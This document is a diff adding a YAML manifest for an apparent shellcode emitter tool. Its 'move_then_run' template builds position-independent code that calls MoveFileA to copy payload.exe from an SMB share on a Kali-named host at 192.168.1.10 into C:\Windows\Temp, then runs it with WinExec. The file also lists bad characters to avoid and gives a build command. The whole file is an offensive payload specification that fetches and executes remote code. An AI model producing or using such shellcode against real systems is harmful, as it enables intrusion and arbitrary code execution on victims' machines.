@@ -1,0 +1,25 @@
+template: move_then_run
+# Move a file to a writable location, then execute it.
+# dst_path is both the move destination and the WinExec command line.
+#
+# Build:
+#   uv run emitter Tools/emitter/manifests/move_then_run.yaml \
+#       --src "\\\\192.168.1.10\\kalismb\\payload.exe" \
+#       --dst "C:\\Windows\\Temp\\payload.exe" \
+#       --out emitter_out/
+badchars: ["00", "0a", "0d"]
+
+functions:
+  - MoveFileA
+  - WinExec
+  - ExitProcess
+
+strings:
+  - label: src_path
+    value: "\\\\192.168.1.10\\kalismb\\payload.exe"
+    method: mov
+    dest: edi
+  - label: dst_path
+    value: "C:\\Windows\\Temp\\payload.exe"
+    method: mov
+    dest: edi
